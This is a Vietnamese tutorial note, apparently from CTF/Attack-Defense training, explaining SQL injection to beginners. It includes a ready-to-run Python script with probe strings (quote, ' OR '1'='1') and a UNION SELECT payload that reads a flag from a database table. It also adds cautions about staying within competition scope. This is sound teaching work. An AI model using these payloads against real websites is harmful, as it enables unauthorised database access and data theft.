# SQLi (chèn lệnh vào câu hỏi database)

Trang web thường ghép thẳng chữ bạn gõ vào 1 câu lệnh hỏi database (gọi là câu lệnh SQL — ngôn ngữ để hỏi/sửa dữ liệu trong database), kiểu `SELECT * FROM products WHERE id = <cái bạn gõ>`. Nếu web không kiểm tra, bạn có thể gõ không phải 1 số mà là 1 đoạn chữ làm thay đổi hẳn câu lệnh — database tưởng đó là lệnh thật và làm theo. Ví dụ gõ `id` là `1 OR 1=1`, câu lệnh thật thi hành thành "lấy mọi dòng" thay vì chỉ 1 dòng — thế là bạn thấy hết dữ liệu của người khác, kể cả dữ liệu chứa flag.

Trên Burp bạn nhận ra lỗi này khi: sửa 1 tham số (`id`, `username`...) thành có dấu nháy `'` hoặc chữ `OR`, thấy trang lỗi 500 (SQL báo lỗi) hoặc trang trả về nhiều/khác dữ liệu hẳn so với bình thường — đó chính là dấu hiệu database đã "nghe theo" câu lệnh giả của bạn.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Bước 1: thử vài chuỗi quen thuộc để xem chỗ nào "nghe theo" lệnh giả
    # '          -> chỉ để phá câu lệnh, xem có lỗi 500 không
    # ' OR '1'='1 -> làm điều kiện WHERE luôn đúng, trả về nhiều/mọi dòng
    probes = ["'", "' OR '1'='1", "' OR '1'='1'-- -"]
    for p in probes:
        r = session.get(f"{base_url}/product", params={"id": p}, timeout=5)
        print("probe:", p, "->", r.status_code, "len=", len(r.text))
        # nếu 1 probe làm trang lỗi 500, hoặc trả dài hẳn ra -> nghi có SQLi ở đây

    # Bước 2: dùng UNION SELECT để "ghép thêm" 1 câu hỏi vào, đọc dữ liệu bảng khác (bảng flags)
    # Số cột trong SELECT phải khớp với câu lệnh gốc của trang -- đoán rồi thử dần: 1,2,3...
    # "-- -" là ký hiệu comment trong SQL, dùng để bỏ qua phần câu lệnh gốc còn thừa phía sau
    payload = "1 UNION SELECT 1,flag,3 FROM flags-- -"
    r = session.get(f"{base_url}/product", params={"id": payload}, timeout=5)

    # Bước 3: tìm flag trong response bằng regex (xem 02_Chuoi_Request/04_Doc_Response.md)
    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **Bước 1 (probe)**: gửi vài chuỗi hay dùng để "ngó" xem trang có bị SQLi không, trước khi tự tin đi khai thác sâu. Dấu nháy `'` đơn lẻ thường làm câu lệnh SQL bị lỗi cú pháp (nếu web không lọc) -> trang trả lỗi 500 thay vì 200/404 như bình thường. Chuỗi `' OR '1'='1` biến điều kiện lọc thành luôn-đúng, nên nếu bình thường trang chỉ trả 1 sản phẩm mà giờ trả về *rất nhiều* sản phẩm hoặc text dài hẳn ra — đó là dấu hiệu SQLi.
- **Bước 2 (UNION SELECT)**: khi đã chắc có SQLi, dùng kỹ thuật UNION để "nối" thêm 1 câu SELECT của riêng mình vào câu lệnh gốc, lấy dữ liệu từ 1 bảng khác (ở đây giả sử có bảng `flags` chứa cột `flag`). Số cột `1,flag,3` phải đúng với số cột câu SELECT gốc của trang — nếu trang gốc select 3 cột, phải đưa đúng 3 giá trị vào UNION SELECT, không thì SQL báo lỗi "số cột không khớp". Lúc thi, cứ thử tăng dần: `UNION SELECT 1`, `UNION SELECT 1,2`, `UNION SELECT 1,2,3`... đến khi hết lỗi là đúng số cột.
- `-- -` ở cuối là dấu comment của SQL (giống `#` trong Python) — mọi chữ sau nó bị database bỏ qua, dùng để "cắt bỏ" phần còn sót lại của câu lệnh gốc phía sau chỗ bạn chèn vào.
- **Bước 3**: dùng lại đúng cách tìm flag bằng `re.search` đã học ở `02_Chuoi_Request/04_Doc_Response.md`.

## Lưu ý nhanh

- Luôn xác định trước **chỗ chèn (inject)** là đâu: query string, 1 field trong form, 1 key trong JSON, hay 1 header/cookie — sửa đúng chỗ đó, không sửa tùm lum.
- Nếu `params=` tự encode payload khác với Burp (ví dụ encode mất dấu `#`), chuyển sang gửi raw URL hoặc dùng `requests.Request(...).prepare()` như ở `01_GET_Query.md`.
- Số cột trong UNION SELECT sai sẽ ra lỗi 500 hoặc trang trống — không phải lỗi script, chỉ cần tăng/giảm số cột rồi thử lại.
- Trong thi Attack-Defense: chỉ test đủ để lấy flag, đừng gửi payload kiểu `DROP TABLE` hay sửa dữ liệu — mục tiêu là đọc, không phải phá.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
